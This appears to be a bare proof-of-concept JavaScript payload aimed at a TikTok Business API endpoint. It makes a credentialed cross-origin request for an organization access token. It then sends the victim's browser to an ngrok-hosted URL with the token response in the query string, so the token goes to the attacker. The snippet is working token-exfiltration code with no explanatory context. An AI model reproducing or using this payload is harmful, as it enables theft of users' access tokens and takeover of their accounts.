var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://business.tiktok.com/api/v2/bm/organization/feelgood/access_token/?attr_source=&source_biz_id=&attr_type=web&msToken=yilgIlrMA-vnHZDQITd05O9Fw_wnOYEfz1Ow0MMOoB9SwyExog3jZ9Ar1KUUgTZyi0fpx5gTaqK2QEsEor5IVaCT8V9IIW1uS2RcYs3_Xi99H9IL_KFJ&X-Bogus=DFSzKIVOblhANG1vtyBlnTO8kJMB&_signature=_02B4Z6wo00001uR.lIgAAIDD-DwqNlsNyiLkbpAAAN337a");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
